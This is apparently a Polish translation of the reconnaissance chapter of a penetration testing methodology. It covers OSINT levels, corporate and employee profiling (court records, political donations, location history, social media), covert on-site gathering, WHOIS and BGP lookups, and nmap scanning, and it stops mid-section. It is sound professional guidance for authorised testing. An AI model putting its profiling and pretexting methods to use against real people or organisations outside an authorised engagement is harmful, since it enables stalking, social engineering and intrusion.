Zbliżając się do organizacji docelowej, ważne jest, aby zrozumieć, że firma może mieć wiele różnych domen najwyższego poziomu (TDL) i firm pomocniczych. Chociaż informacje te powinny były zostać odkryte na etapie ustalania zakresu, nie jest niczym niezwykłym zidentyfikowanie dodatkowych domen serwerów i firm, które mogły nie być częścią początkowego zakresu omówionego na etapie wstępnego zaangażowania. Na przykład firma może mieć TDL .com. Mogą jednak mieć również domeny .net .co i .xxx. Mogą one wymagać uwzględnienia w zmienionym zakresie lub mogą być niedostępne. Tak czy inaczej, należy to uzgodnić z klientem przed rozpoczęciem testowania. Nie jest też niczym niezwykłym, że firma ma pod sobą kilka spółek podrzędnych. Na przykład General Electric i Proctor and Gamble są właścicielami wielu mniejszych firm.

Weź pod uwagę wszelkie ograniczenia Zasad zaangażowania
W tym momencie warto zapoznać się z Zasadami Zaangażowania. Często zapomina się o nich podczas testu. Czasami jako testerzy jesteśmy tak pochłonięci tym, co znajdujemy i możliwościami ataku, że zapominamy, które adresy IP, domeny i sieci możemy zaatakować. Zawsze odwołuj się do Zasad zaangażowania, aby zachować koncentrację na testach. Jest to ważne nie tylko z perspektywy prawnej, ale także z punktu widzenia pełzania zakresu. Za każdym razem, gdy odchodzisz od głównych celów testu, tracisz czas. A na dłuższą metę może to kosztować Twoją firmę pieniądze.

Rozważ czas trwania testu
Ilość czasu przeznaczonego na cały test będzie miała bezpośredni wpływ na ilość zbierania danych wywiadowczych, które można wykonać. Istnieją testy, w których całkowity czas wynosi od dwóch do trzech miesięcy. Podczas tych zadań firma testująca spędzałaby ogromną ilość czasu na analizowaniu każdej z podstawowych jednostek biznesowych i personelu firmy. Jednak w przypadku krótszych testów w stylu kryształowego pudełka cele mogą być znacznie bardziej taktyczne. Na przykład testowanie określonej aplikacji internetowej może nie wymagać badania dokumentacji finansowej dyrektora generalnego firmy.

Rozważ cel końcowy testu
Każdy test ma na uwadze cel końcowy — konkretny zasób lub proces, który organizacja uważa za krytyczny. Mając na uwadze wynik końcowy, faza zbierania informacji powinna uwzględniać wszystkie drugorzędne i trzeciorzędne elementy otaczające cel końcowy. Niezależnie od tego, czy są to technologie wspierające, osoby trzecie, odpowiedni personel itp. Upewnienie się, że skupiono się na krytycznych zasobach, zapewnia, że ​​mniej istotne elementy wywiadowcze są usuwane z priorytetów i kategoryzowane jako takie, aby nie ingerować w proces analizy.

OSINT
Open Source Intelligence (OSINT) przybiera trzy formy; Pasywne, półpasywne i aktywne.

Pasywne zbieranie informacji : Pasywne zbieranie informacji jest ogólnie przydatne tylko wtedy, gdy istnieje bardzo wyraźny wymóg, aby działania związane z gromadzeniem informacji nigdy nie zostały wykryte przez cel. Ten rodzaj profilowania jest technicznie trudny do wykonania, ponieważ nigdy nie wysyłamy żadnego ruchu do organizacji docelowej ani z jednego z naszych hostów, ani z „anonimowych” hostów lub usług w Internecie. Oznacza to, że możemy wykorzystywać i gromadzić tylko zarchiwizowane lub przechowywane informacje. W związku z tym informacje te mogą być nieaktualne lub nieprawidłowe, ponieważ jesteśmy ograniczeni do wyników zebranych od osób trzecich.

Półpasywne zbieranie informacji : Celem półpasywnego zbierania informacji jest profilowanie celu za pomocą metod, które wyglądają jak normalny ruch i zachowanie w Internecie. Odpytujemy tylko opublikowane serwery nazw w celu uzyskania informacji, nie przeprowadzamy dogłębnych wyszukiwań wstecznych ani żądań DNS typu brute force, nie szukamy „nieopublikowanych” serwerów ani katalogów. Nie przeprowadzamy skanowania portów ani robotów indeksujących na poziomie sieci i patrzymy tylko na metadane w opublikowanych dokumentach i plikach; nie poszukują aktywnie ukrytych treści. Kluczem jest tu nie zwracanie uwagi na nasze działania. Post mortem cel może być w stanie cofnąć się i odkryć działania zwiadowcze, ale nie powinien być w stanie nikomu ich przypisać.

Aktywne zbieranie informacji : Aktywne zbieranie informacji powinno zostać wykryte przez cel i podejrzane lub złośliwe zachowanie. Na tym etapie aktywnie mapujemy infrastrukturę sieciową (pomyśl o pełnym skanowaniu portów nmap –p1-65535), aktywnie wyliczamy i/lub skanujemy otwarte usługi pod kątem luk w zabezpieczeniach, aktywnie szukamy nieopublikowanych katalogów, plików i serwerów. Większość z tych działań mieści się w typowych czynnościach „rozpoznawczych” lub „skanujących” pod kątem standardowego pentestu.

Zbiorowy
Fizyczny
Lokalizacje (L1)
W podziale na lokalizację wykaz pełnych adresów, własności, powiązanych dokumentów (miasto, podatki, prawne itp.), pełny wykaz wszystkich fizycznych środków bezpieczeństwa w danej lokalizacji (umiejscowienie kamer, czujniki, ogrodzenia, posterunki strażnicze, kontrola wejść, bramy, rodzaj identyfikacji , wejście dostawcy, fizyczne lokalizacje oparte na blokach IP/usługach geolokalizacyjnych itp. Dla Hostów/NOC: Pełna notacja CIDR hostów i sieci, pełna lista DNS wszystkich powiązanych zasobów, Pełne mapowanie AS, ścieżki peeringu, udostępnianie CDN, właściciele bloków sieciowych (dane whois), rekordy e-mail (MX + struktura adresu e-mail)

Właściciel (L1/L2)
Ewidencja gruntów/podatków (L1/L2)
Wspólne/indywidualne (L1/L2)
Strefy czasowe (L1/L2)
Gospodarze / NOC
Wszechobecność (L1)
Nierzadko organizacja docelowa ma wiele oddzielnych lokalizacji fizycznych. Na przykład bank będzie miał biura centralne, ale będzie miał również wiele zdalnych oddziałów. Podczas gdy bezpieczeństwo fizyczne i techniczne może być bardzo dobre w centralnych lokalizacjach, odległe lokalizacje często mają słabe kontrole bezpieczeństwa.

Relacje (L1)
Partnerzy biznesowi, służby celne, dostawcy, analizy za pośrednictwem tego, co jest otwarcie udostępniane na korporacyjnych stronach internetowych, w wypożyczalniach itp. Informacje te można wykorzystać do lepszego zrozumienia projektów biznesowych lub organizacyjnych. Na przykład, jakie produkty i usługi są krytyczne dla organizacji docelowej?

Informacje te można również wykorzystać do stworzenia udanych scenariuszy socjotechnicznych.

Relacje (L2/L3)
Ręczna analiza w celu sprawdzenia informacji z poziomu 1 oraz zagłębienia się w możliwe relacje.
Współdzielona przestrzeń biurowa (L2/L3)
Infrastruktura współdzielona (L2/L3)
Wypożyczony/leasingowany sprzęt (L2/L3)
Logiczny
Zgromadzone informacje dla partnerów, klientów i konkurentów: dla każdego z nich pełna lista nazwy firmy, adresu firmy, rodzaju relacji, podstawowych informacji finansowych, podstawowych informacji o hostach/sieci.

Partnerzy Biznesowi (L1/L2/L3)
Reklamowani partnerzy biznesowi celu. Czasami reklamowane na głównej stronie www.
Klienci biznesowi (L1/L2/L3)
Reklamowani klienci biznesowi celu. Czasami reklamowane na głównej stronie www.
Zawodnicy (L1/L2/L3)
Kim są konkurenci celu. Może to być proste, Ford vs Chevy, lub może wymagać znacznie więcej analiz.
Wykres dotykowy (L1)
Touchgraph (wizualna reprezentacja społecznych powiązań między ludźmi) pomoże nakreślić możliwe interakcje między ludźmi w organizacji i jak uzyskać do nich dostęp z zewnątrz (kiedy touchgraph obejmuje społeczności zewnętrzne i jest tworzony z poziomem głębi powyżej 2).
Podstawowy wykres dotykowy powinien odzwierciedlać strukturę organizacyjną wynikającą z dotychczas zebranych informacji i na jego podstawie powinna opierać się dalsza rozbudowa wykresu (ponieważ zwykle lepiej odzwierciedla on koncentrację na aktywach organizacji i wyjaśnia możliwe wektory podejścia.
Profil odkurzacza (L1/L2)
Co: półotwarty zasób wywiadowczy (zwykle płatne subskrypcje). Takie źródła specjalizują się w gromadzeniu informacji biznesowych o firmach i dostarczaniu „znormalizowanego” spojrzenia na biznes.
Dlaczego: Informacje obejmują fizyczne lokalizacje, otoczenie konkurencyjne, kluczowy personel, informacje finansowe i inne dane związane z działalnością (w zależności od źródła). Można to wykorzystać do stworzenia dokładniejszego profilu celu i zidentyfikowania dodatkowego personelu i osób trzecich, które można wykorzystać w teście.
Jak: Proste wyszukiwanie na stronie z nazwą firmy zapewnia pełny profil firmy i wszystkie informacje, które są na niej dostępne. Zaleca się korzystanie z kilku źródeł w celu ich wzajemnego odniesienia i upewnienia się, że otrzymujesz najbardziej aktualne informacje. (płatny za usługę).
Linia produktów (L2/L3)
Oferta produktowa celu, która może wymagać dodatkowej analizy, jeśli cel oferuje również usługi, może wymagać dalszej analizy.
Pionowy rynek (L1)
W jakiej branży rezyduje cel, tj. finansowa, obronna, rolnicza, rządowa itp
Konta marketingowe (L2/L3)
Działania marketingowe mogą dostarczyć wielu informacji na temat strategii marketingowej celu
Oceń wszystkie sieci mediów społecznościowych pod kątem profili społecznościowych celu
Oceń przeszłe * kampanie marketingowe celu
Spotkania (L2/L3)
Opublikowano protokół ze spotkania?
Spotkania otwarte dla publiczności?
Znaczące daty firmy (L1/L2/L3)
Spotkanie zarządu
Wakacje
rocznice
Uruchomienie produktu/usługi
Oferty pracy (L1/L2)
Przeglądając listę ofert pracy w organizacji (zwykle znajdującą się w sekcji „kariera” na ich stronie internetowej), możesz określić rodzaje technologii używanych w organizacji. Jednym z przykładów może być sytuacja, w której organizacja ma ofertę pracy dla starszego administratora systemu Solaris, wtedy jest całkiem oczywiste, że organizacja korzysta z systemów Solaris. Inne stanowiska mogą nie być tak oczywiste na podstawie nazwy stanowiska, ale otwarte stanowisko młodszego administratora sieci może sugerować, że „preferowane CCNA” lub „preferowane JNCIA”, co oznacza, że ​​korzystają z technologii Cisco lub Juniper.
Przynależność do organizacji charytatywnych (L1/L2/L3)
Bardzo często zdarza się, że członkowie kierownictwa docelowej organizacji są związani z organizacjami charytatywnymi. Informacje te można wykorzystać do opracowania solidnych scenariuszy inżynierii społecznej dla kadry kierowniczej.
Zapytanie ofertowe, zapytanie ofertowe i inne informacje o przetargach publicznych (L1/L2)
Zapytania ofertowe i zapytania ofertowe często ujawniają wiele informacji o typach systemów używanych przez firmę, a potencjalnie nawet o lukach lub problemach z jej infrastrukturą.
Dowiedzenie się, kim są obecni zwycięzcy przetargów, może ujawnić typy używanych systemów lub lokalizację, w której zasoby firmy mogą być hostowane poza siedzibą firmy.
Akta sądowe (L2/L3)
Akta sądowe są zwykle dostępne bezpłatnie lub czasami za opłatą.
Treść postępowania sądowego może ujawnić informacje o wcześniejszych osobach składających skargę, w tym między innymi o pozwach byłych pracowników
Rejestry karne obecnych i byłych pracowników mogą zawierać listę celów dla działań socjotechnicznych
Darowizny polityczne (L2/L3)
Mapowanie darowizn politycznych lub innych interesów finansowych jest ważne w celu zidentyfikowania kluczowych osób, które mogą nie zajmować oczywistych stanowisk władzy, ale mają własny interes (lub jest nim zainteresowany).
Mapowanie darowizn na cele polityczne będzie się różnić w zależności od kraju w zależności od wolności informacji, ale często przypadki darowizn z innych krajów można prześledzić wstecz, korzystając z dostępnych tam danych.
Licencje lub rejestry zawodowe (L2/L3)
Zebranie listy docelowych licencji zawodowych i rejestrów może dać wgląd nie tylko w to, jak firma działała, ale także w wytyczne i przepisy, których przestrzegają, aby utrzymać te licencje. Doskonałym tego przykładem jest certyfikacja standardu ISO firmy, która może wykazać, że firma przestrzega ustalonych wytycznych i procesów. Ważne jest, aby tester był świadomy tych procesów i tego, jak mogą one wpłynąć na testy przeprowadzane w organizacji.
Firma często umieszcza te informacje na swojej stronie internetowej jako odznakę honorową. W innych przypadkach może być konieczne przeszukanie rejestrów dla danej branży w celu sprawdzenia, czy organizacja jest członkiem. Dostępne informacje są bardzo zależne od rynku pionowego, a także położenia geograficznego firmy. Należy również zauważyć, że firmy międzynarodowe mogą mieć różne licencje i być zobowiązane do rejestracji w różnych standardach lub organach prawnych w zależności od kraju.
Schemat organizacyjny (L1)
Identyfikacja pozycji
Ważne osoby w organizacji
Osoby do konkretnego celu
Transakcje
Mapowanie zmian w organizacji (awansy, ruchy boczne)
Partnerzy
Mapowanie organizacji stowarzyszonych, które są powiązane z biznesem

Elektroniczny
Metadane dokumentu (L1/L2)
Co to jest? Metadane lub metatreść dostarczają informacji o danych/dokumencie w zakresie. Może zawierać informacje, takie jak nazwisko autora/twórcy, czas i data, używane/odwołane standardy, lokalizacja w sieci komputerowej (informacje o drukarce/folderze/katalogu/itp.), znaczniki geograficzne itp. W przypadku obrazu jego metadane mogą zawierają kolor, głębię, rozdzielczość, markę/typ aparatu, a nawet współrzędne i informacje o lokalizacji.
Dlaczego miałbyś to zrobić? Metadane są ważne, ponieważ zawierają informacje o sieci wewnętrznej, nazwach użytkowników, adresach e-mail, lokalizacjach drukarek itp. i pomogą w stworzeniu planu lokalizacji. Zawiera również informacje o oprogramowaniu użytym do tworzenia poszczególnych dokumentów. Może to umożliwić atakującemu utworzenie profilu i/lub przeprowadzenie ukierunkowanych ataków z wewnętrzną wiedzą na temat sieci i użytkowników.
Jak byś to zrobił? Dostępne są narzędzia do wyodrębniania metadanych z pliku (pdf/word/image), takie jak FOCA (oparte na GUI), metagoofil (oparte na Pythonie), meta-extractor, exiftool (oparte na Perlu). Narzędzia te są w stanie wyodrębnić i wyświetlić wyniki w różnych formatach, takich jak HTML, XML, GUI, JSON itp. Dane wejściowe do tych narzędzi to głównie dokument pobrany z publicznej obecności „klienta”, a następnie przeanalizowany, aby dowiedzieć się więcej na jego temat . Podczas gdy FOCA pomaga wyszukiwać dokumenty, pobierać je i analizować za pośrednictwem interfejsu GUI.
Komunikacja marketingowa (L1/L2)
Przeszłe kampanie marketingowe dostarczają informacji o projektach, które mogły zostać wycofane i które mogą być nadal dostępne.
Obecna komunikacja marketingowa zawiera elementy projektu (kolory, czcionki, grafikę itp.), które w większości są również wykorzystywane wewnętrznie.
Dodatkowe informacje kontaktowe, w tym zewnętrzne organizacje marketingowe.
Zasoby infrastrukturalne
Posiadane bloki sieciowe (L1)
Bloki sieciowe należące do organizacji można uzyskać pasywnie, przeprowadzając wyszukiwania whois. DNSStuff.com to punkt kompleksowej obsługi umożliwiający uzyskiwanie tego typu informacji.
Wyszukiwanie adresów IP w otwartym kodzie źródłowym może dostarczyć informacji o typach infrastruktury w miejscu docelowym. Administratorzy często publikują informacje o adresie IP w kontekście próśb o pomoc w różnych witrynach pomocy technicznej.
Adresy e-mail (L1)
Adresy e-mail zapewniają potencjalną listę prawidłowych nazw użytkowników i struktury domen
Adresy e-mail można zbierać z wielu źródeł, w tym ze stron internetowych organizacji.
Profil infrastruktury zewnętrznej (L1)
Profil infrastruktury zewnętrznej celu może dostarczyć ogromnej ilości informacji na temat technologii wykorzystywanych wewnętrznie.
Informacje te można zbierać z wielu źródeł, zarówno pasywnie, jak i aktywnie.
Profil powinien być wykorzystany przy konstruowaniu scenariusza ataku na infrastrukturę zewnętrzną.
Zastosowane technologie (L1/L2)
OSINT przeszukuje fora wsparcia, listy mailingowe i inne zasoby, które mogą gromadzić informacje o technologiach wykorzystywanych przez cel
Wykorzystanie inżynierii społecznej przeciwko zidentyfikowanej organizacji informatycznej
Stosowanie inżynierii społecznej przeciwko sprzedawcom produktów
Umowy zakupu (L1/L2/L3)
Umowy kupna zawierają informacje o sprzęcie, oprogramowaniu, licencjach i dodatkowych środkach trwałych znajdujących się w miejscu docelowym.
Zdalny dostęp (L1/L2)
Uzyskanie informacji o tym, jak pracownicy i/lub klienci łączą się z celem dostępu zdalnego, stanowi potencjalny punkt wejścia.
Często link do portalu zdalnego dostępu jest dostępny poza stroną główną celu
Dokumenty How To ujawniają aplikacje/procedury umożliwiające nawiązywanie połączeń dla użytkowników zdalnych
Użycie aplikacji (L1/L2)
Zbierz listę znanych aplikacji używanych przez organizację docelową. Często można to osiągnąć, wyodrębniając metadane z publicznie dostępnych plików (jak omówiono wcześniej)

Technologie obronne (L1/L2/L3)
Używane technologie obronne polegające na pobieraniu odcisków palców można osiągnąć na wiele sposobów, w zależności od stosowanych zabezpieczeń.

Pasywne pobieranie odcisków palców
Przeszukaj fora i publicznie dostępne informacje, na których technicy docelowej organizacji mogą omawiać problemy lub prosić o pomoc w zakresie używanej technologii
Wyszukiwanie informacji marketingowych dla docelowej organizacji oraz popularnych dostawców technologii
Za pomocą Tin-eye (lub innego narzędzia do dopasowywania obrazów) wyszukaj logo docelowej organizacji, aby zobaczyć, czy jest ono wymienione na stronach referencyjnych dostawców lub w materiałach marketingowych
Aktywne pobieranie odcisków palców
Wyślij odpowiednie pakiety próbne do systemów publicznych, aby przetestować wzorce blokowania. Istnieje kilka narzędzi do pobierania odcisków palców określonych typów WAF.
Informacje nagłówkowe zarówno w odpowiedziach z docelowej strony internetowej, jak i w wiadomościach e-mail często zawierają informacje nie tylko o używanych systemach, ale także o włączonych konkretnych mechanizmach ochronnych (np. skanery antywirusowe bramy pocztowej)
Zdolność człowieka (L1/L2/L3)
Odkrywanie ludzkich zdolności obronnych docelowej organizacji może być trudne. Istnieje kilka kluczowych informacji, które mogą pomóc w ocenie bezpieczeństwa docelowej organizacji.

Sprawdź obecność ogólnofirmowego zespołu CERT/CSIRT/PSRT
Sprawdź ogłoszenia o pracę, aby zobaczyć, jak często wymienione jest stanowisko bezpieczeństwa
Sprawdź ogłoszenia o pracę, aby zobaczyć, czy bezpieczeństwo jest wymienione jako wymóg dla zadań niezwiązanych z bezpieczeństwem (np. programiści)
Sprawdź umowy outsourcingu, aby zobaczyć, czy bezpieczeństwo celu zostało zlecone częściowo lub w całości
Sprawdź, czy konkretne osoby pracujące dla firmy mogą być aktywne w społeczności zajmującej się bezpieczeństwem
Budżetowy
Raportowanie (L1/L2)
Docelowa sprawozdawczość finansowa będzie w dużym stopniu zależała od lokalizacji organizacji. Raportowanie może być również dokonywane za pośrednictwem centrali organizacji, a nie dla każdego oddziału. W 2008 roku SEC wydała propozycję planu działania dotyczącego przyjęcia Międzynarodowych Standardów Sprawozdawczości Finansowej (MSSF) w USA.

Przyjęcie MSSF według kraju --> http://www.iasplus.com/en/resources/use-of-ifrs

Analiza rynku (L1/L2/L3)
Uzyskaj raporty z analizy rynku od organizacji analitycznych (takich jak Gartner, IDC, Forrester, 541 itp.). Powinno to obejmować definicję rynku, kapitalizację rynkową, konkurentów oraz wszelkie istotne zmiany w wycenie, produkcie lub firmie w ogóle.
Kapitał handlowy
Zidentyfikuj, czy organizacja przeznacza jakikolwiek kapitał handlowy i jaki procent ogólnej wyceny i wolnego kapitału posiada. Wskaże to, jak wrażliwa jest organizacja na wahania rynkowe i czy jest uzależniona od inwestycji zewnętrznych w ramach swojej wyceny i przepływów pieniężnych.
Historia wartości
Wykres wyceny organizacji w czasie, w celu ustalenia korelacji między zdarzeniami zewnętrznymi i wewnętrznymi oraz ich wpływu na wycenę.
EDGAR (SEC)
Co to jest: EDGAR (system elektronicznego gromadzenia, analizy i wyszukiwania danych) to baza danych amerykańskiej Komisji ds. Bezpieczeństwa i Giełd (SEC), która zawiera oświadczenia rejestracyjne, raporty okresowe i inne informacje dotyczące wszystkich firm (zarówno zagranicznych, jak i krajowych) którzy są prawnie zobowiązani do złożenia.
Dlaczego to zrobić: Dane EDGAR są ważne, ponieważ oprócz informacji finansowych identyfikują kluczowy personel w firmie, który w inny sposób może nie być widoczny na stronie internetowej firmy lub w innej publicznej obecności. Zawiera również oświadczenia o wynagrodzeniach kadry zarządzającej, nazwiska i adresy głównych właścicieli akcji zwykłych, podsumowanie postępowań sądowych przeciwko spółce, czynniki ryzyka ekonomicznego i inne potencjalnie interesujące dane.
Jak uzyskać: Informacje są dostępne na stronie internetowej SEC EDGAR ( http://www.sec.gov/edgar.shtml ). Szczególnie interesujące są raporty 10-K (raport roczny) i 10-Q (raport kwartalny).
Indywidualny
Pracownik
Historia
Akta sądowe (L2/L3)
Co to jest: Akta sądowe to wszystkie rejestry publiczne związane ze skargami karnymi i/lub cywilnymi, pozwami sądowymi lub innymi działaniami prawnymi na rzecz lub przeciwko osobie lub organizacji będącej przedmiotem zainteresowania.
Dlaczego miałbyś to zrobić: Akta sądowe mogą potencjalnie ujawnić poufne informacje dotyczące pojedynczego pracownika lub całej firmy. Te informacje mogą być przydatne same w sobie lub mogą być motorem do uzyskania dodatkowych informacji. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych sądów i baz danych akt. Niektóre dodatkowe informacje mogą być dostępne za pośrednictwem płatnych usług, takich jak LEXIS/NEXIS. Niektóre informacje mogą być dostępne na prośbę o rejestrację lub osobiście.
Darowizny polityczne (L2/L3)
Co to jest: darowizny na cele polityczne to osobiste fundusze danej osoby kierowane do określonych kandydatów politycznych, partii politycznych lub organizacji o specjalnym interesie.
Dlaczego miałbyś to robić: informacje o darowiznach na cele polityczne mogą potencjalnie ujawnić przydatne informacje dotyczące danej osoby. Informacje te można wykorzystać jako część analizy sieci społecznościowych, aby pomóc w nawiązaniu powiązań między osobami a politykami, kandydatami politycznymi lub innymi organizacjami politycznymi. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych (np. http://www.opensecrets.org/ ), które śledzą indywidualne darowizny na cele polityczne. W zależności od prawa danego stanu, darowizny powyżej określonej kwoty zwykle muszą być rejestrowane.
Licencje lub rejestry zawodowe (L2/L3)
Co to jest: licencje lub rejestry zawodowe to repozytoria informacji zawierające listy członków i inne powiązane informacje dotyczące osób, które uzyskały określoną licencję lub pewien stopień przynależności do społeczności.
Dlaczego miałbyś to zrobić: informacje o licencjach zawodowych mogą potencjalnie ujawnić przydatne informacje dotyczące danej osoby. Informacje te mogą być wykorzystane do sprawdzenia wiarygodności danej osoby (czy rzeczywiście posiadają określony certyfikat, jak twierdzą) lub jako część analizy sieci społecznościowych, aby pomóc w nawiązaniu powiązań między osobami a innymi organizacjami. Można go również wykorzystać do inżynierii społecznej lub do innych celów później w teście penetracyjnym.
Jak byś to zrobił: Wiele z tych informacji jest obecnie dostępnych w Internecie za pośrednictwem publicznie dostępnych stron internetowych. Zazwyczaj każda organizacja prowadzi własny rejestr informacji, które mogą być dostępne online lub których zebranie może wymagać dodatkowych czynności.
Profil sieci społecznościowej (SocNet).
Wyciek metadanych (L2/L3)
Świadomość lokalizacji za pomocą metadanych zdjęć
Ton (L2/L3)
Oczekiwany rezultat: subiektywna identyfikacja tonu używanego w komunikacji – agresywny, pasywny, atrakcyjny, sprzedażowy, chwalący, dyskredytujący, protekcjonalny, arogancki, elitarny, słabszy, przywódca, naśladowca, naśladownictwo itp.
Częstotliwość (L2/L3)
Oczekiwany rezultat: Określenie częstotliwości publikacji (raz na godzinę/dzień/tydzień itd.). Dodatkowo - pora dnia/tygodnia, w której najczęściej dochodzi do komunikacji.
Świadomość lokalizacji (L2/L3)
Historia lokalizacji na mapie dla profilowanej osoby z różnych źródeł, czy to poprzez bezpośrednią interakcję z aplikacjami i sieciami społecznościowymi, czy poprzez bierne uczestnictwo poprzez metadane zdjęć.
Aplikacje mapy Bing
czworokąt
Współrzędne Google
Skowyt
Gowalla
Obecność w mediach społecznościowych (L1/L2/L3)
Zweryfikuj konto/obecność celu w mediach społecznościowych (L1). I przedstaw szczegółową analizę (L2/L3)
Obecność w Internecie
Adres e-mail (L1)
Co to jest? Adresy e-mail to identyfikatory publicznych skrzynek pocztowych użytkowników.
Dlaczego miałbyś to zrobić? Zbieranie lub wyszukiwanie adresów e-mail jest ważne, ponieważ służy wielu celom - zapewnia prawdopodobny format identyfikatora użytkownika, który można później brutalnie wymusić w celu uzyskania dostępu, ale co ważniejsze, pomaga w wysyłaniu ukierunkowanego spamu, a nawet do zautomatyzowanych botów. Te wiadomości spamowe mogą zawierać exploity, złośliwe oprogramowanie itp. i mogą być adresowane z określoną treścią, szczególnie do użytkownika.
Jak byś to zrobił? Adresy e-mail można wyszukiwać i wyodrębniać z różnych stron internetowych, grup, blogów, forów, portali społecznościowych itp. Te adresy e-mail są również dostępne na różnych stronach pomocy technicznej. Istnieją narzędzia zbierające i pająki do wyszukiwania adresów e-mail mapowanych na określoną domenę (w razie potrzeby).
Osobiste uchwyty/pseudonimy (L1)
Zarejestrowane nazwy domen osobistych (L1/L2)
Przypisane statyczne adresy IP/bloki sieciowe (L1/L2)
Lokalizacja fizyczna
Lokalizacja fizyczna
Czy możesz ustalić fizyczną lokalizację celu
Ślad mobilny
Numer telefonu (L1/L2/L3)
Typ urządzenia (L1/L2/L3)
Użyj (L1/L2/L3)
Zainstalowane aplikacje (L1/L2/L3)
Właściciel/administrator (L1/L2/L3)

Informacje „za opłatą”.
Kontrole w tle
Za Pay Linked-In
LEXIS/NEXIS
Tajne zgromadzenie
Zbiorowy
Spotkanie na miejscu
Wybieranie konkretnych lokalizacji do zbierania na miejscu, a następnie przeprowadzanie rekonesansu w czasie (zwykle co najmniej 2-3 dni w celu zapewnienia wzorców). Podczas zbierania danych wywiadowczych na miejscu poszukiwane są następujące elementy:

Inspekcje bezpieczeństwa fizycznego
Skanowanie bezprzewodowe / skanowanie częstotliwości RF
Inspekcja szkoleń z zachowania pracowników
Obiekty dostępne/sąsiadujące (powierzchnie wspólne)
Nurkowanie w śmietniku
Rodzaje używanego sprzętu
Spotkanie poza siedzibą firmy
Identyfikacja lokalizacji poza siedzibą firmy i ich znaczenie/powiązanie z organizacją. Są to zarówno logiczne, jak i fizyczne lokalizacje, zgodnie z poniższym:

Lokalizacje centrów danych
Udostępnianie/dostawca sieci
HUMINT
Inteligencja ludzka uzupełnia bardziej pasywne gromadzenie zasobów, ponieważ dostarcza informacji, których nie można by uzyskać w inny sposób, a także dodaje więcej „osobistych” perspektyw do obrazu wywiadowczego (uczucia, historia, relacje między kluczowymi osobami, „atmosfera” itp. ...)

Metodologia pozyskiwania ludzkiej inteligencji zawsze wiąże się z bezpośrednią interakcją – czy to fizyczną, czy werbalną. Gromadzenie powinno odbywać się pod przybraną tożsamością, która zostałaby stworzona specjalnie w celu uzyskania optymalnej ekspozycji informacji i współpracy z danego zasobu.

Dodatkowo, zbieranie danych wywiadowczych na bardziej wrażliwych celach może odbywać się wyłącznie poprzez obserwację – ponownie fizycznie na miejscu lub za pomocą środków elektronicznych/zdalnych (CCTV, kamery internetowe itp.). Zwykle robi się to w celu ustalenia wzorców zachowań (takich jak częstotliwość wizyt, zasady ubioru, ścieżki dostępu, kluczowe lokalizacje, które mogą zapewniać dodatkowy dostęp, takie jak kawiarnie).

Wyniki
Kluczowi pracownicy
Partnerzy/Dostawcy
Inżynieria społeczna
Odcisk stopy
CO TO JEST: Zewnętrzne gromadzenie informacji, znane również jako footprinting, to faza gromadzenia informacji, która polega na interakcji z celem w celu uzyskania informacji z perspektywy zewnętrznej w stosunku do organizacji.

DLACZEGO: Wiele informacji można zebrać poprzez interakcję z celami. Sondując usługę lub urządzenie, często można stworzyć scenariusze, w których można pobrać odcisk palca lub jeszcze prościej, można uzyskać baner, który zidentyfikuje urządzenie. Ten krok jest niezbędny, aby zebrać więcej informacji o celach. Twoim celem, po tej sekcji, jest uszeregowana pod względem ważności lista celów.

Ślad zewnętrzny
Zidentyfikuj zewnętrzne zakresy klientów
Jednym z głównych celów zbierania danych wywiadowczych podczas testu penetracyjnego jest określenie hostów, które będą objęte zakresem. Istnieje wiele technik, które można wykorzystać do identyfikacji systemów, w tym odwrotne wyszukiwanie DNS, bruting DNS, wyszukiwanie WHOIS w domenach i zakresach. Te i inne techniki są udokumentowane poniżej.

Rekonesans pasywny
Wyszukiwania WHOIS
W przypadku śledzenia zewnętrznego najpierw musimy ustalić, który z serwerów WHOIS zawiera informacje, których szukamy. Biorąc pod uwagę, że powinniśmy znać TLD domeny docelowej, musimy po prostu zlokalizować rejestratora, u którego zarejestrowana jest domena docelowa.

Informacje WHOIS są oparte na hierarchii drzewa. ICANN (IANA) jest autorytatywnym rejestrem dla wszystkich domen TLD i jest doskonałym punktem wyjścia dla wszystkich ręcznych zapytań WHOIS.

ICANN – http://www.icann.org
IANA - http://www.iana.com
NRO - http://www.nro.net
AFRINIC - http://www.afrinic.net
APNIC - http://www.apnic.net
ARIN - http://ws.arin.net
LACNIC - http://www.lacnic.net
RIPE - http://www.ripe.net
Po zapytaniu odpowiedniego rejestratora możemy uzyskać informacje o rejestrującym. Istnieje wiele witryn oferujących informacje WHOIS; jednak w celu zapewnienia dokładności dokumentacji należy korzystać tylko z odpowiedniego rejestratora.

InterNIC - http://www.internic.net/ http://www.internic.net ]
Zazwyczaj prosty whois przeciwko ARIN skieruje Cię do właściwego rejestratora.

Okulary BGP
Możliwe jest zidentyfikowanie numeru systemu autonomicznego (ASN) dla sieci uczestniczących w protokole Border Gateway Protocol (BGP). Ponieważ ścieżki tras BGP są reklamowane na całym świecie, możemy je znaleźć za pomocą zwierciadła BGP4 i BGP6.

BGP4 - http://www.bgp4.as/ Looking-glasses
BPG6 - http://lg.he.net/
Aktywny ślad
Skanowanie portów
Techniki skanowania portów będą się różnić w zależności od ilości czasu dostępnego na test i konieczności działania w ukryciu. Jeśli wiedza o systemach jest zerowa, do identyfikacji systemów można użyć szybkiego skanowania ping. Ponadto należy uruchomić szybkie skanowanie bez weryfikacji ping (-PN w nmap), aby wykryć najczęściej dostępne porty. Po zakończeniu można uruchomić bardziej kompleksowe skanowanie. Niektórzy testerzy sprawdzają tylko otwarte porty TCP, sprawdź również UDP. Dokument http://nmap.org/nmap_doc.html szczegółowo opisuje typy skanowania portów. Nmap („Network Mapper”) jest de facto standardem audytu/skanowania sieci. Nmap działa zarówno w systemie Linux, jak i Windows.

Więcej informacji na temat wykorzystania Nmap do tego celu można znaleźć w Wytycznych technicznych PTES

Nmap ma dziesiątki dostępnych opcji. Ponieważ ta sekcja dotyczy skanowania portów, skupimy się na poleceniach wymaganych do wykonania tego zadania. Należy zauważyć, że używane polecenia zależą głównie od czasu i liczby skanowanych hostów. Im więcej hostów lub mniej czasu masz na wykonanie tych zadań, tym mniej będziemy przesłuchiwać hosta. Stanie się to oczywiste, gdy będziemy kontynuować dyskusję na temat opcji.

